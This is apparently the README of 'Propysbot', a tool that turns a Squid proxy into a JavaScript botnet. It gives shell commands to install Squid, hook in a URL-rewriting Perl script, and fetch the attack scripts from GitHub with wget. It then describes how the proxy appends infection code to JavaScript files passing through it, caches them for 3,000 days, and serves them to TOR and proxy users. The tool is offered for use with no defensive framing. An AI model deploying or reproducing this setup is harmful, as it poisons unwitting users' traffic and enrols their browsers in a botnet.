# Propysbot
Botnet Javascript in Server Proxy

# about
Moving from an environment that specifically infects a
JavaScript file, we decided that the best way to create the
botnet would be if bots did "motu proprio", it means, not a
forced man in the middle, but chosen by themselves. Hereby
we decided to focus on the TOR network and Proxy servers
used on the Internet.

# Starting
```
apt-get install squid3
cd /etc/squid3/
nano squid.conf 
  write: url_rewrite_program /usr/bin/perl /etc/squid3/poison.pl in last line
wget https://raw.githubusercontent.com/RedToor/Propysbot/master/poison.pl
nano poison.pl 
  modify the line:
  print "http://myip:80/tmp/$pid-$count.js\n"; # REPLACE_IP
  with you ip 
wget https://raw.githubusercontent.com/RedToor/Propysbot/master/pasarela.js
chmod 777 /var/www/html/
service apache2 start
service squid3 start
```
# Logic
1) Download the file from its original location.<br>
2) Save it to a temporary location.<br>
3) Add the JavaScript infection code at the end of the
JavaScript file.<br>
4) Make that file has an expiration date of 3,000 days.<br>
5) Deliver to the clients the new created JavaScript file.<br>

http://cave-rt.blogspot.com/2015/06/como-hacer-una-botnet-js-con-squid-proxy.html
